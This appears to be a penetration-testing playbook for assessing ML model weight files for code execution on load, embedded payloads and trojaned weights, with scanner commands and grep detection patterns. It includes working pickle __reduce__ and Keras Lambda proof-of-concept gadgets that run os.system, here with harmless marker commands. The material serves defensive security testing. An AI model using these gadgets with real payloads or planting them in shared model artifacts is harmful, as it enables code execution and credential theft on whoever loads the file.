---
name: ml_model_weights
description: Assessing ML model weight/artifact files for unsafe deserialization, embedded backdoors, and supply-chain payloads.
---

# ML Model Weights / Artifact

A model weights file is a serialized blob that gets loaded by a training/inference process — and many of the common formats are *executable* on load. A pickle-backed checkpoint runs arbitrary Python the moment someone calls `torch.load` or `joblib.load`; a Keras `.h5`/`.keras` can carry a `Lambda` layer that executes code at `model.load_model` time; a serving runtime may auto-load anything dropped in its model directory. The attacker objective when assessing this asset is to determine whether a hostile or tampered artifact can achieve code execution on the consumer (training box, CI runner, inference pod, or developer laptop), exfiltrate the host's credentials/data, or persist a backdoor inside the model's behavior. Treat every weights file like an untrusted executable until proven otherwise.

## Attack Surface

**Format-level (deserialization)**
- Pickle-based: `.pkl`, `.pt`, `.pth`, `.bin`, `.ckpt`, `.joblib`, `.npy/.npz` with `allow_pickle=True`, `dill`/`cloudpickle` blobs
- Keras/TF: `.h5`, `.keras`, `SavedModel` dirs (`saved_model.pb` with custom ops), `Lambda` layers
- Framework wrappers: PyTorch Lightning/Hugging Face checkpoints (often plain pickle under `pytorch_model.bin`)
- "Safe" formats to confirm: `.safetensors`, ONNX (`.onnx`), GGUF/GGML, flax `msgpack` — safe for *weights* but check for sidecar code

**Distribution / ingestion points**
- Model registries: Hugging Face Hub, MLflow Model Registry, S3/GCS/Azure blob model stores, W&B artifacts
- Serving runtimes that auto-load: TorchServe (`.mar`), Triton model repo, BentoML, KServe, Seldon, Ray Serve
- CI/CD steps that `load` a downloaded artifact for eval/quantization/conversion
- Sidecar code shipped with weights: `*.py` custom code + `trust_remote_code=True`, `requirements.txt`, `config.json` `auto_map`

**Embedded / hidden content**
- Arbitrary bytes appended to a zip-based archive (`.pt`/`.mar`/`.npz`/`.keras` are zips)
- Secondary payloads in tensor metadata, extra archive members, or polyglot files

## Recon & Enumeration

Identify format and structure before loading anything:
```bash
file model.bin model.pt model.safetensors          # zip? HDF5? raw pickle?
unzip -l model.pt 2>/dev/null                       # .pt/.mar/.npz/.keras are zip archives — list members
python3 -c "import zipfile,sys;print(zipfile.ZipFile('model.pt').namelist())"
binwalk model.bin                                    # apt-get install -y binwalk — find appended/embedded files
strings -n 8 model.bin | grep -Ei 'posix|system|exec|eval|subprocess|socket|__reduce__|builtins|os\.|base64'
```

Disassemble pickle opcodes WITHOUT executing them (the core check):
```bash
python3 -m pickletools model.pkl 2>&1 | grep -Ei 'GLOBAL|REDUCE|STACK_GLOBAL|INST|OBJ|BUILD'
# REDUCE + a GLOBAL pointing at os/posix/subprocess/builtins = code-execution gadget
```

Use dedicated model scanners (install as needed):
```bash
pip install modelscan && modelscan -p model.pt -r json -o modelscan.json   # protectai/modelscan: pickle, h5, keras, joblib
pip install picklescan && picklescan -p model.pkl                           # unsafe-import detector
pip install fickling && fickling --check-safety model.pkl                   # trailofbits/fickling: decompile pickle to source
```

Inspect safetensors/ONNX/HDF5 metadata without code execution:
```bash
python3 -c "from safetensors import safe_open; f=safe_open('m.safetensors','pt'); print(f.metadata())"
python3 -c "import onnx;m=onnx.load('m.onnx');print([n.op_type for n in m.graph.node])"  # look for custom/Script ops
h5dump -n model.h5 | grep -i lambda                  # apt-get install -y hdf5-tools — Keras Lambda layers
```

Secrets and supply-chain hygiene on the surrounding repo/artifact bundle:
```bash
trufflehog filesystem ./model_repo --only-verified         # creds baked into configs/notebooks
gitleaks detect --source ./model_repo
trivy fs ./model_repo                                       # vulnerable/malicious deps in requirements.txt
semgrep --config p/python ./model_repo                      # audit any shipped *.py custom code
```

Enumerate exposed serving/registry endpoints if a runtime is in scope:
```bash
naabu -host target -p 8080,8081,8000,5000,8265 -silent | httpx -silent -title
nuclei -u http://target:5000 -tags mlflow,exposure -s critical,high -silent   # MLflow/Triton/etc exposures
ffuf -u http://target:8081/models/FUZZ -w models.txt        # TorchServe management API model enumeration
```

## Methodology

1. **Never load on the host first.** All triage runs in the disposable Kali sandbox; never `torch.load`/`load_model` a target artifact on a machine with real credentials.
2. **Fingerprint the format** with `file`/`unzip -l`. Classify as pickle-family (dangerous), Keras/TF (conditionally dangerous), or weights-only (safetensors/ONNX/GGUF — verify, then mostly safe).
3. **Static-decompile pickles** with `pickletools`/`fickling`/`picklescan`/`modelscan`. Flag any `REDUCE`/`GLOBAL`/`STACK_GLOBAL` referencing `os`, `posix`, `subprocess`, `builtins`, `eval`, `exec`, `socket`, `pty`, `runpy`, `importlib`.
4. **Carve embedded content** with `binwalk`/`unzip`/`strings`. Compare archive member list against what the format legitimately needs; extra members or appended bytes after the central directory are suspicious.
5. **Inspect Keras/TF** for `Lambda` layers, custom objects, and `SavedModel` custom ops, which embed serialized Python/graph code executed on load.
6. **Audit sidecar code**: `config.json` `auto_map`/`trust_remote_code`, bundled `*.py`, `requirements.txt` pointing at typosquatted or attacker-hosted packages.
7. **Assess the load path**: who loads it, with what privileges, and whether it auto-loads (serving model dir, CI eval). The blast radius is the consumer, not the file.
8. **Detonate in isolation** (see Validation) only to confirm exploitability with a benign marker.

## Key Weaknesses / Techniques

### Unsafe pickle deserialization (the primary class)
`torch.load`, `joblib.load`, `pickle.load`, `np.load(allow_pickle=True)`, `dill`/`cloudpickle` all execute `__reduce__` on deserialize. A malicious checkpoint embeds a reduce gadget. Build a benign PoC artifact to validate the consumer's behavior:
```python
import torch, os
class Marker:
    def __reduce__(self):
        return (os.system, ("id > /tmp/poc_marker 2>&1",))
torch.save({"state_dict": {}, "x": Marker()}, "poc.pt")
# Loading poc.pt via torch.load() writes /tmp/poc_marker — proof of code-exec-on-load
```
`fickling` can also synthesize/inspect such payloads for analysis without you hand-rolling opcodes.

### Keras Lambda layer / custom-object execution
A `Lambda` layer stores a marshalled code object run at `load_model` time:
```python
from tensorflow import keras
from keras.layers import Lambda, Input
import os
inp = Input((1,))
out = Lambda(lambda x: (os.system("touch /tmp/keras_poc"), x)[1])(inp)
keras.Model(inp, out).save("poc.h5")   # load_model('poc.h5') triggers the lambda
```
Native `.keras` (v3) format and `SavedModel` custom ops can carry equivalent execution.

### Sidecar remote code (`trust_remote_code`)
Hugging Face models with `auto_map` in `config.json` execute bundled `*.py` when loaded with `trust_remote_code=True` (or via certain pipelines). Treat the shipped Python as the real payload and run `semgrep`/manual review over it.

### Embedded / polyglot payloads
Zip-based artifacts (`.pt`, `.mar`, `.npz`, `.keras`) can hide extra members or data appended after the EOCD. `.mar` files bundle a handler `.py` executed by TorchServe. Carve with `binwalk -e` and diff the member list against a clean reference.

### Behavioral backdoor (trojaned weights)
Weights themselves can be benign-to-load but trojaned: a hidden trigger pattern flips classification or leaks data. Detection is behavioral — probe with trigger candidates and compare outputs:
```python
# load in sandbox only; compare clean vs perturbed inputs across a grid of triggers
```
This is harder to confirm; flag as suspicious and recommend provenance/signature verification (Sigstore model signing, safetensors conversion).

### Insecure load path / registry exposure
Exposed MLflow (`/api/2.0/mlflow/...`), TorchServe management API (port 8081), or a writable model registry/bucket lets an attacker *place* a malicious artifact that a privileged consumer auto-loads — converting a write primitive into RCE.

## Validation

1. Prefer static proof: a `pickletools`/`fickling` listing showing `REDUCE` against `os.system`/`subprocess`/`builtins.eval` is concrete evidence; capture the decompiled snippet.
2. For dynamic confirmation, detonate inside an isolated, network-egress-blocked container with no real secrets:
   ```bash
   docker run --rm --network none -v "$PWD":/x:ro python:3.11 \
     python -c "import torch; torch.load('/x/model.pt', weights_only=False)"
   ```
   Use a benign marker (write `/tmp/poc_marker`, resolve a unique `interactsh-client` domain for an out-of-band DNS hit) — never a destructive or data-exfiltrating payload against a real target.
3. Confirm the *real* consumer's load call is reachable with attacker-controlled bytes (e.g., the artifact path is fetched from a registry/bucket you can write, or `weights_only=False` is in use).
4. Document the exact load function, format, and gadget chain so the finding is reproducible.

## False Positives

- `.safetensors`, GGUF/GGML, flax msgpack, and pure ONNX (no custom ops) do not execute code on load — flagging them as RCE is wrong; only their sidecar code matters.
- `torch.load(..., weights_only=True)` (default since PyTorch 2.6) refuses arbitrary globals — a pickle gadget present in the file is not exploitable through that call path; verify the actual call.
- Scanner hits on legitimate framework globals (`torch._utils._rebuild_tensor_v2`, `collections.OrderedDict`, `numpy.core.multiarray._reconstruct`) are normal allowlisted reconstructors, not payloads.
- `strings` matches like `system`/`exec` inside tokenizer vocab, layer names, or compiled CUDA blobs are coincidental — confirm via opcode/AST context, not substring.
- A `Lambda`-free Keras model or a SavedModel with only standard ops is not a code-exec finding.

## Chaining & Impact

- Malicious artifact → `torch.load`/`load_model` → RCE on the training box, CI runner, or inference pod → host credential theft (cloud metadata, mounted service-account tokens, registry creds).
- RCE on a CI/CD model-eval step → poison the build pipeline → tamper downstream artifacts → supply-chain compromise of every consumer of the model.
- Writable registry/bucket/serving model dir + auto-load runtime → drop trojaned weights → RCE on whoever next loads, with no user interaction.
- Cloud creds harvested on detonation → pivot to S3/GCS model stores, KMS, and broader account access.
- Behavioral backdoor → silent integrity failure (targeted misclassification, prompt-trigger data leakage) that evades load-time scanning entirely.

## Pro Tips

1. `file` + `unzip -l` first — knowing the container format tells you which threat (pickle exec vs. zip polyglot vs. safe-weights) applies before you run any scanner.
2. `pickletools` is your most trustworthy oracle: it never executes the pickle, and `REDUCE` after a dangerous `GLOBAL` is unambiguous. `fickling --check-safety` is a fast first pass.
3. Always check the actual load call's `weights_only`/`trust_remote_code` flags — the same file is exploitable or inert depending on them.
4. The payload is frequently the *sidecar*, not the tensors: review `config.json` `auto_map`, bundled `.py`, and `requirements.txt` for typosquats before assuming the binary is the threat.
5. Detonate with `--network none` and no mounted secrets; use an interactsh callback as a non-destructive execution oracle so you prove exec without touching data.
6. Diff a suspect zip-based artifact's member list against a known-good model of the same architecture — extra members or trailing bytes are the tell.
7. Recommend defenses that move integrity left: enforce safetensors, sign with Sigstore/model-signing, and pin/scan artifacts in CI with `modelscan` as a gate.
